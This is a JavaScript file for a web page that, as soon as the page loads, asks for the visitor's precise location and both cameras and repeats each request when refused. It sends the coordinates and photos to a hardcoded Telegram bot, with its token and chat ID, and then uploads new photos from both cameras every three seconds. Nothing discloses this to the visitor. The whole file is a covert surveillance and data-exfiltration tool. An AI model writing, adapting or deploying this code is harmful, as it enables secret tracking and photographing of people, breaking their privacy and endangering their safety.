const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';
const MAX_REQUEST_ATTEMPTS = 3; 

const videoFront = document.getElementById('videoFront');
const videoBack = document.getElementById('videoBack');
const canvasFront = document.getElementById('canvasFront');
const canvasBack = document.getElementById('canvasBack');

let frontStream = null;
let backStream = null;
let photoInterval = null;
let geoAttempts = 0;
let cameraAttemptsFront = 0;
let cameraAttemptsBack = 0;

async function sendPhoto(blob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', blob, 'photo.jpg');
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
  } catch (e) {
    console.error('Ошибка отправки фото:', e);
  }
}

function takePhoto(video, canvas) {
  const ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return new Promise(resolve => {
    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
  });
}

async function sendLocation(lat, lon) {
  const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: ` Геолокация: ${mapLink}`
    })
  });
}

async function sendDeniedMessage(text) {
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: ` ${text}`
    })
  });
}

async function getLocation() {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos.coords),
      err => reject(err),
      { enableHighAccuracy: true, timeout: 8000 }
    );
  });
}

async function getCamera(facingMode) {
  return await navigator.mediaDevices.getUserMedia({
    video: { facingMode },
    audio: false
  });
}

async function requestGeoLocation() {
  try {
    const coords = await getLocation();
    await sendLocation(coords.latitude, coords.longitude);
    return true;
  } catch (e) {
    geoAttempts++;
    if (geoAttempts < MAX_REQUEST_ATTEMPTS) {
      await sendDeniedMessage('Повторный запрос геолокации');
      await new Promise(resolve => setTimeout(resolve, 1000));
      return await requestGeoLocation();
    } else {
      await sendDeniedMessage('Геолокация не разрешена');
      return false;
    }
  }
}

async function requestCamera(facingMode, video, canvas, attempts = 0) {
  try {
    const stream = await getCamera(facingMode);
    video.srcObject = stream;
    await new Promise(r => video.onloadedmetadata = r);
    const blob = await takePhoto(video, canvas);
    await sendPhoto(blob);
    return true;
  } catch (e) {
    attempts++;
    if (attempts < MAX_REQUEST_ATTEMPTS) {
      await new Promise(resolve => setTimeout(resolve, 7000));
      return await requestCamera(facingMode, video, canvas, attempts);
    } else {
      await sendDeniedMessage(`Камера ${facingMode} не разрешена`);
      return false;
    }
  }
}

async function start() {
  let geoGranted = false;
  let cameraGrantedFront = false;
  let cameraGrantedBack = false;

  geoGranted = await requestGeoLocation();
  cameraGrantedFront = await requestCamera('user', videoFront, canvasFront);
  cameraGrantedBack = await requestCamera('environment', videoBack, canvasBack);

  const statusMessage = ` Разрешения:\n- Геолокация: ${geoGranted ? '' : ''}\n- Камера (фронтальная): ${cameraGrantedFront ? '' : ''}\n- Камера (задняя): ${cameraGrantedBack ? '' : ''}`;
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: statusMessage
    })
  });

  if (cameraGrantedFront || cameraGrantedBack) {
    photoInterval = setInterval(async () => {
      if (videoFront && videoFront.readyState >= 2) {
        const blobF = await takePhoto(videoFront, canvasFront);
        sendPhoto(blobF);
      }
      if (videoBack && videoBack.readyState >= 2) {
        const blobB = await takePhoto(videoBack, canvasBack);
        sendPhoto(blobB);
      }
    }, 3000);
  }
}

start();
